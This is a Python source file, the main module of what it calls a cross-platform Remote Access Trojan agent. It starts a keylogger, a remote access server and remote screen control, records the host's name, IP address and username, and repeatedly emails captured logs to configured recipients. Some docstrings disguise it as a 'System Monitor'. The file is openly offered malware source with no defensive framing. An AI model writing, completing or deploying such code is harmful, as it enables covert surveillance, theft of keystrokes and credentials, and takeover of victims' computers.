#!/usr/bin/env python3
"""
RAT Agent - Main Application
Cross-platform Remote Access Trojan agent
"""

import os
import sys
import time
import signal
import threading
import platform
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from rat_agent.config import Config
from rat_agent.database import init_db, save_system_info
from rat_agent.logger import LogCapture
from rat_agent.emailer import EmailSender
from rat_agent.remote import RemoteAccess
from rat_agent.keylogger import Keylogger
from rat_agent.screen import RemoteScreen

class RATAgent:
    """Main System Monitor Agent class"""
    
    def __init__(self):
        self.config = Config()
        self.emailer = EmailSender(self.config)
        self.logger = LogCapture(self.config)
        self.remote = RemoteAccess(self.config)
        self.keylogger = Keylogger(self.config)
        self.screen = RemoteScreen(self.config)
        self.running = True
        self.log_thread = None
        self.remote_thread = None
        self.keylog_thread = None
        
        # Initialize database
        init_db()
        
        print("=" * 60)
        print(f"           {self.config.APP_NAME} v1.0.0")
        print("=" * 60)
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Platform: {platform.system()} {platform.release()}")
        print(f"PID: {os.getpid()}")
        print("=" * 60)
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\n[*] Received signal {signum}, shutting down...")
        self.stop()
    
    def start(self):
        """Start the System Monitor agent"""
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Capture initial system info
        self._capture_initial_info()
        
        # Start remote access server
        self.remote_thread = threading.Thread(target=self.remote.start_server)
        self.remote_thread.daemon = True
        self.remote_thread.start()
        
        # Start log capture thread
        self.log_thread = threading.Thread(target=self._log_capture_loop)
        self.log_thread.daemon = True
        self.log_thread.start()
        
        # Start keylogger
        if self.config.KEYLOGGER_ENABLED:
            self.keylogger.start()
            print(f"[+] Keylogger enabled")
        
        # Initialize screen (will be activated via dashboard)
        print(f"[+] Remote screen control ready (activate via dashboard)")
        
        print(f"[+] {self.config.APP_NAME} started successfully")
        print(f"[+] Log capture interval: {self.config.LOG_CAPTURE_INTERVAL} seconds")
        print(f"[+] Remote access port: {self.config.REMOTE_PORT}")
        print(f"[+] Recipients: {self.config.DEFAULT_RECIPIENTS}")
        print("[*] Press Ctrl+C to stop")
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(60)
                self._heartbeat()
        except KeyboardInterrupt:
            self.stop()
    
    def _capture_initial_info(self):
        """Capture initial system information"""
        print("[*] Capturing initial system information...")
        
        try:
            import socket
            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()} {platform.machine()}"
            
            try:
                ip_address = socket.gethostbyname(hostname)
            except:
                ip_address = "Unknown"
            
            try:
                username = os.environ.get('USER', os.environ.get('USERNAME', 'Unknown'))
            except:
                username = "Unknown"
            
            save_system_info(hostname, os_info, ip_address, username)
            print(f"[+] System info saved: {hostname}")
            
        except Exception as e:
            print(f"[-] Error capturing system info: {e}")
    
    def _log_capture_loop(self):
        """Main log capture loop"""
        print("[*] Log capture thread started")
        
        # Send initial logs immediately
        time.sleep(5)  # Small delay after startup
        self._capture_and_send_logs()
        
        while self.running:
            try:
                self._capture_and_send_logs()
            except Exception as e:
                print(f"[-] Log capture error: {e}")
            
            # Sleep in small intervals to respond to shutdown faster
            for _ in range(self.config.LOG_CAPTURE_INTERVAL):
                if not self.running:
                    break
                time.sleep(1)
    
    def _capture_and_send_logs(self):
        """Capture logs and send via email"""
        print(f"[*] Capturing logs at {datetime.now().strftime('%H:%M:%S')}")
        
        try:
            # Capture logs
            logs = self.logger.capture()
            
            # Save to database
            from rat_agent.database import save_log
            save_log(logs)
            
            # Send via email
            if self.emailer.send_logs(logs):
                print("[+] Logs sent successfully")
            else:
                print("[-] Failed to send logs")
                
        except Exception as e:
            print(f"[-] Error in log capture: {e}")
    
    def _heartbeat(self):
        """Print heartbeat status"""
        status = self.remote.get_status()
        print(f"[~] Heartbeat - Remote: {'Running' if status['running'] else 'Stopped'}, "
              f"Clients: {status['clients']}")
    
    def stop(self):
        """Stop the System Monitor agent"""
        print("\n[*] Stopping System Monitor...")
        self.running = False
        
        # Stop keylogger
        if self.config.KEYLOGGER_ENABLED:
            self.keylogger.stop()
        
        # Stop remote server
        if self.remote.running:
            self.remote.stop_server()
        
        # Wait for threads to finish
        if self.log_thread and self.log_thread.is_alive():
            self.log_thread.join(timeout=5)
        
        if self.remote_thread and self.remote_thread.is_alive():
            self.remote_thread.join(timeout=5)
        
        print(f"[+] {self.config.APP_NAME} stopped")
        print("=" * 60)


def main():
    """Main entry point"""
    agent = RATAgent()
    agent.start()


if __name__ == "__main__":
    main()
